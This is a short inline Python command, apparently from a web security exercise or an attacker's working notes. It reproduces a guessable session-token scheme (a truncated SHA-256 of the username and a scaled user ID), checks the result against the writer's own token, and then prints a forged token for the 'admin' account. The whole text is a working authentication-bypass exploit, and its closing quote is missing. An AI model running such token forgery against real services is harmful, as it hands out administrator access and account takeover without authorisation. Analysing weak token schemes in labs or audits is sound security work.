python3 -c "
import hashlib

def token(username, user_id):
    s = username + str(user_id * 31337)
    return hashlib.sha256(s.encode()).hexdigest()[:16]

print('Verify against your own token:')
print('  computed:', token('sondrenodenes', 5))
print('  actual  :', '27c8ec76aba008e8')

print('Forged admin token:', token('admin', 1))
